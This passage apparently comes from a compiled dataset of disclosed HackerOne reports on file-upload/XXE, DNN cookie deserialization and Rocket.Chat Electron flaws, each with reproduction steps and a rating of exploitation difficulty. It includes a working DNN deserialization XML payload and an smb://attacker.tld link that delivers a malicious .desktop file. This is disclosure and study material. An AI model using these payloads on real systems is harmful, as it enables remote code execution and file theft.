3. Add 'html;' attributes in the parameter of 'allow_file_type_list', or delete the params of 'allow_file_type_list', then replace the filename's suffix '.jpg' to '.html'
4. Get the server's response information, visit the uploaded file URL
5. Upload a malicious xml file to the server, change the parameter of '_hxpage' or 'HX_PAGE_NAME' params of xml data by post
6. Post the edited request, the server will visit the attacker's server to get the DTD file
Exploitation Difficulty:
The attack requires multiple steps including intercepting and modifying requests, understanding server responses, and crafting malicious files. However, the steps are somewhat straightforward once the initial bypass is understood, and the interactions between components are not overly subtle.

--------------------------------------------------------------------------------



OS Command Injection Vulnerabilities (2 reports)
--------------------------------------------------

Report https://hackerone.com/reports/876708: Remote Code Execution through DNN Cookie Deserialization 
================================================================================
RAW DESCRIPTION:

Summary:
The application at https://████████ presents a deserialization vulnerability that permits RCE and file read/write
Step-by-step Reproduction Instructions
Navigate to a random page that must return a 404 Error status like https://████/test
Add this cookie in the request header: DNNPersonalization
Insert the payload into the DNNPersonalization cookie. You can generate a payload with the following tool https://github.com/pwntester/ysoserial.net, using the DotNetNuke plugin, or use the official exploit from here: https://www.exploit-db.com/exploits/48336, or use the following payload to read a file from the system:
Code 806 Bytes
1<profile>
2<item key="name1:key1" type="System.Data.Services.Internal.ExpandedWrapper`2[[DotNetNuke.Common.Utilities.FileSystemUtils],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=█████████]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=███████"><ExpandedWrapperOfFileSystemUtilsObjectDataProvider xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
3<ExpandedElement/>
4<ProjectedProperty0>
5<MethodName>WriteFile</MethodName>
6<MethodParameters>
7<anyType xsi:type="xsd:string">test</anyType>
8</MethodParameters>
9<ObjectInstance xsi:type="FileSystemUtils"></ObjectInstance>
10</ProjectedProperty0>
11</ExpandedWrapperOfFileSystemUtilsObjectDataProvider>
12</item>
13</profile>
Where test is the wanted file
Expected result:
████
Product, Version, and Configuration (If applicable)
Platform: https://████████/shell.aspx
Vulnerable Product: DotNetNuke
Vulnerable Version: < 9.3.0-RC
Suggested Mitigation/Remediation Actions
Update the DotNetNuke (DNN) product to the latest version or to a more recent version that is not vulnerable
Impact
An attacker can execute remote commands on the system and gain unauthorized access to it.



================================================================================
Vulnerability Description:
The vulnerability is a deserialization flaw in DotNetNuke (DNN) that allows remote code execution (RCE) and file read/write operations via the 'DNNPersonalization' cookie. Attackers can craft a malicious payload to exploit this vulnerability.

Steps to Reproduce:
1. Navigate to a random page that returns a 404 Error status (e.g., https://████/test)
2. Add the 'DNNPersonalization' cookie to the request header with a malicious payload (generated using tools like ysoserial.net or the exploit from Exploit-DB)
3. Send the request to trigger deserialization of the malicious payload
Exploitation Difficulty:
The attack involves understanding deserialization vulnerabilities, crafting a specific payload for DNN, and manipulating the cookie header. While the steps are straightforward, the payload construction requires knowledge of DNN's internals and deserialization exploits.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/924151: Insecure use of shell.openExternal() in Rocket.Chat Desktop App leading to RCE
================================================================================
RAW DESCRIPTION:

Summary: The Rocket.Chat Desktop app passes the links users click on to Electron's shell.openExternal() function which can lead to remote code execution.
Description: The filtering on the URLs passed to shell.openExternal() is insufficient. An attacker can craft and send a link that when clicked will cause malicious code from a remote origin to be executed on the user's system. The specific attack presented here has been tested with Xubuntu 20.04, however similar attacks are also possible on other systems, including non-Linux operating systems.
Releases Affected:
Tested with latest release 2.17.10 from https://github.com/RocketChat/Rocket.Chat.Electron/releases
Tested with latest commit 4c06582 on the develop branch from https://github.com/RocketChat/Rocket.Chat.Electron
Steps To Reproduce (from initial installation to vulnerability):
Install Rocket.Chat Desktop on Xubuntu 20.04.
Login and join a channel.
[Desktop Entry]

From another account in the same channel, send the following message with the corresponding values replaced: smb://attacker.tld/public/pwn.desktop
Click the link and (if necessary) confirm starting the untrusted launcher.
Notice the calculator and message box appearing, confirming remote code execution.
Supporting Material/References:
I have attached a video of the attack to the report.
Suggested mitigation
The problem is in the filter for local file paths in the preload scripts that sets up the link handler here: https://github.com/RocketChat/Rocket.Chat.Electron/blob/4c06582ba3021fcf10e6230286231d50e26e2723/src/preload/links.js#L24
The filter only acts as a blocklist, filtering out file:// links. There are however plenty of other protocols depending on the system, like smb:// as shown here. Therefore, only an allowlist can successfully prevent attacks here. Usually, allowing http://, https:// and mailto: will be enough but you may have different requirements.
Best Regards,

Benjamin Altpeter

Technical University of Braunschweig, Germany
Impact
The attack can be triggered remotely by an attacker by simply sending a message to a channel.
The particular attack presented here requires user interaction. The user has to click the link (which is not obfuscated) and potentially confirm launching the executable. The last part may not be necessary depending on the particular attack vector and system the user runs.
This particular presented attack only works on certain Linux distributions. However, this is only due to the particular attack payload used (a Linux .desktop file accessed over Samba). Similar payloads will also work on other Linux distributions as well as Windows and macOS. The Electron documentation explicitly warns against using shell.openExternal() with untrusted content: https://www.electronjs.org/docs/tutorial/security#14-do-not-use-openexternal-with-untrusted-content
If the attack is executed successfully, the attacker can run arbitrary code on the user's system.
Patching the problem is simple and doesn't break any legitimate use cases that I can think of.
The particular attack presented here requires user interaction. The user has to click the link (which is not obfuscated) and potentially confirm launching the executable. The last part may not be necessary depending on the particular attack vector and system the user runs.
This particular presented attack only works on certain Linux distributions. However, this is only due to the particular attack payload used (a Linux .desktop file accessed over Samba). Similar payloads will also work on other Linux distributions as well as Windows and macOS. The Electron documentation explicitly warns against using shell.openExternal() with untrusted content: https://www.electronjs.org/docs/tutorial/security#14-do-not-use-openexternal-with-untrusted-content
If the attack is executed successfully, the attacker can run arbitrary code on the user's system.
Patching the problem is simple and doesn't break any legitimate use cases that I can think of.



================================================================================
Vulnerability Description:
The Rocket.Chat Desktop app insecurely uses Electron's shell.openExternal() function to handle clicked links, allowing an attacker to craft a malicious link that, when clicked, executes arbitrary code on the user's system. The vulnerability arises from insufficient URL filtering, which only blocks file:// links but allows other dangerous protocols like smb://.

Steps to Reproduce:
1. Install Rocket.Chat Desktop on Xubuntu 20.04.
2. Login and join a channel.
3. From another account in the same channel, send a message with a crafted link: smb://attacker.tld/public/pwn.desktop
4. Click the link and confirm starting the untrusted launcher if prompted.
5. Observe the calculator and message box appearing, confirming remote code execution.
Exploitation Difficulty:
The vulnerability involves understanding how shell.openExternal() works in Electron and recognizing that the application's URL filtering is insufficient. The attack requires crafting a specific payload (a .desktop file accessed over Samba) and understanding that the user interaction (clicking the link) can lead to code execution. While the attack requires user interaction, the discovery of the vulnerability is straightforward once the behavior of shell.openExternal() is understood.

--------------------------------------------------------------------------------



